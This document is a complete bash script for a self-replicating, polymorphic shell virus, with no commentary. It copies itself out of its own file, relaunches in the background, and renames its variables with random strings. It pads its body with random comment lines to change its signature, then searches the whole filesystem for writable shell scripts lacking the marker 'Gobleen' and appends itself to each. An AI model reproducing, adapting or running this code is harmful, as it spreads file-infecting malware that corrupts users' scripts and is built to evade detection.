virus_length=45
echo -n "`cat $0`" | grep -v '^#' | tail -n $virus_length > /tmp/pure_virus
echo \#!/bin/bash > /tmp/infector; head -n 1 /tmp/pure_virus >> /tmp/infector
tail -n `expr $virus_length - 5` /tmp/pure_virus >> /tmp/infector
chmod 755 /tmp/infector; (/tmp/infector &); exit 0
variables="pure_virus infector variable_length mutated_string mutation temporary do_random_number variable_name symbol variables create_string virus_length virus_piece body_part"
do_random_number () {
    RANDOM=$RANDOM
    return `expr $(($RANDOM % $(($2 - $1)))) + $1` }
mutation () {
    sed s/$1/$2/g /tmp/pure_virus > /tmp/temporary; cp /tmp/temporary /tmp/pure_virus }
create_string() {
    variable_length=$1
    until [ $variable_length -eq 0 ] ; do
	do_random_number 65 122
	symbol=$?
	if [ $symbol -lt 91 -o $symbol -gt 96 ] ; then
	    mutated_string=$mutated_string`echo -e '\'$(printf %o $symbol)`
	    variable_length=`expr $variable_length - 1`
	fi;
    done }
do_random_number 3 `expr $virus_length / 3`
split -l $? /tmp/pure_virus /tmp/virus_piece
for body_part in /tmp/virus_piece* ; do
    mutated_string=""
    do_random_number 15 50
    create_string $?
    echo '# '$mutated_string >> $body_part
done
cat /tmp/virus_piece* >> /tmp/temporary
rm /tmp/virus_piece*
mv /tmp/temporary /tmp/pure_virus
for variable_name in $variables; do
    mutated_string=""
    do_random_number 4 14
    create_string $?
    mutation $variable_name $mutated_string
done
rm /tmp/temporary
find / -type f -perm +111 -exec bash -c \
"if [ -z \"\`grep -s Gobleen {}\`\" -a -w {} -a -n \"\`file {} | grep Bourne\`\" ] ; then
    echo >> {}
    cat /tmp/pure_virus >> {}
fi" \;
rm /tmp/infector; rm /tmp/pure_virus
# This comment is necessary!